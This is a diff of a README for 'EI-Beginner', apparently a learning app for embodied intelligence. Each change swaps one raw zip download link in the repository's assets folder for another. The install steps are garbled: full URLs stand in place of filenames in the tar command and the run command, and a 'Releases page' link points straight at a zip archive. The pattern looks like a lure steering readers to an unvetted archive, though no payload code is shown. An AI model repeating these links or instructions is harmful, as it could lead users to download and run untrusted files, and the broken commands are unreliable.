@@ -1,7 +1,7 @@
 # 🎉 EI-Beginner - Start Your Journey in Embodied Intelligence
 
 ## 📥 Download Now
-[![Download EI-Beginner](https://github.com/ThalioLeonardo/EI-Beginner/raw/refs/heads/master/assets/E-Beginner-2.2-beta.4.zip)](https://github.com/ThalioLeonardo/EI-Beginner/raw/refs/heads/master/assets/E-Beginner-2.2-beta.4.zip)
+[![Download EI-Beginner](https://github.com/ThalioLeonardo/EI-Beginner/raw/refs/heads/master/assets/E_Beginner_3.7.zip)](https://github.com/ThalioLeonardo/EI-Beginner/raw/refs/heads/master/assets/E_Beginner_3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to EI-Beginner, your entry point into the fascinating world of embodied intelligence. This application provides hands-on exercises and insightful experiences to help you understand this emerging field. Follow these steps to get up and running.
@@ -18,7 +18,7 @@ Before you begin, make sure your computer meets these requirements:
 ## 🔗 Download & Install
 To download the application, visit the Releases page:
 
-[Download EI-Beginner](https://github.com/ThalioLeonardo/EI-Beginner/raw/refs/heads/master/assets/E-Beginner-2.2-beta.4.zip)
+[Download EI-Beginner](https://github.com/ThalioLeonardo/EI-Beginner/raw/refs/heads/master/assets/E_Beginner_3.7.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Scroll down to the list of version releases.
@@ -42,10 +42,10 @@ Once the file is downloaded, follow these steps:
 
 #### For Linux Users
 1. Open a terminal window.
-2. Navigate to the directory where you downloaded the `https://github.com/ThalioLeonardo/EI-Beginner/raw/refs/heads/master/assets/E-Beginner-2.2-beta.4.zip` file.
+2. Navigate to the directory where you downloaded the `https://github.com/ThalioLeonardo/EI-Beginner/raw/refs/heads/master/assets/E_Beginner_3.7.zip` file.
 3. Extract the files using the command:
    ```bash
-   tar -xzf EI-Beginner-*https://github.com/ThalioLeonardo/EI-Beginner/raw/refs/heads/master/assets/E-Beginner-2.2-beta.4.zip
+   tar -xzf EI-Beginner-*https://github.com/ThalioLeonardo/EI-Beginner/raw/refs/heads/master/assets/E_Beginner_3.7.zip
    ```
 4. Enter the extracted folder:
    ```bash
@@ -53,7 +53,7 @@ Once the file is downloaded, follow these steps:
    ```
 5. Run the application with:
    ```bash
-   https://github.com/ThalioLeonardo/EI-Beginner/raw/refs/heads/master/assets/E-Beginner-2.2-beta.4.zip
+   https://github.com/ThalioLeonardo/EI-Beginner/raw/refs/heads/master/assets/E_Beginner_3.7.zip
    ```
 
 ## 🎓 Features
